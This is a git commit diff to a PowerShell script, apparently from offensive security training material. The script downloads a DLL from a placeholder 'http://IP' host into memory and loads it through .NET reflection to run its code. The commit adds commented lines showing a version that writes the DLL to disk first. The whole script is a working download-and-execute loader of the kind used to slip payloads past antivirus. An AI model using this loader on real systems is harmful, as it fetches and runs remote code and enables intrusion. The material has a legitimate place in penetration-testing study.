06b746d551e3d6ac2a870b37e22cdc4de4ff542b
blueberry <huifeng1@vt.edu>
2021-11-30 21:56:10 -0500

    Update reflectionRunner.ps1

--- ClientSideWithWindowsScriptHost/reflectionRunner.ps1
+++ ClientSideWithWindowsScriptHost/reflectionRunner.ps1
@@ -1,9 +1,13 @@
 ##ClassLibary1.dll is the compiled dll from class1.cs
 ##DownloadData method will save DLL as a byte array in memory 
 $data = (New-Object System.Net.WebClient).DownloadData('http://IP/ClassLibrary1.dll')
-
 ##load assembly
 $assem = [System.Reflection.Assembly]::Load($data)
+
+#if you have to download the dll to disk, you can use the loadfile method
+#(New-Object System.Net.WebClient).DownloadFile('http://ip/ClassLibrary1.dll', 'C:\Users\mst\ClassLibrary1.dll')
+#$assem = [System.Reflection.Assembly]::LoadFile("C:\Users\Offsec\ClassLibrary1.dll")
+
 ##interact with it using reflection through the GetType and
 ##GetMethod methods, and  call it through the Invoke method
 $class = $assem.GetType("ClassLibrary1.Class1")
